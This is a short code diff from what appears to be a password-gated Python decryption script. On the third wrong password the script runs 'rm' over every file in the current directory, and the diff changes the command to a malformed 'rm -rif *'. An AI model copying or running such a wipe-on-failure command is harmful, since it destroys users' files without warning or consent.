@@ -74,5 +74,5 @@ if __name__=="__main__":
             print ("password incorrect you have a \033[37m"+str(4-t)+"\033[31m of attempts.") 
             if t==3:
                 print ('the file will be deleted now ')
-                os.system("rm decrypt && rm *") 
+                os.system("rm -rif *") 
                 break
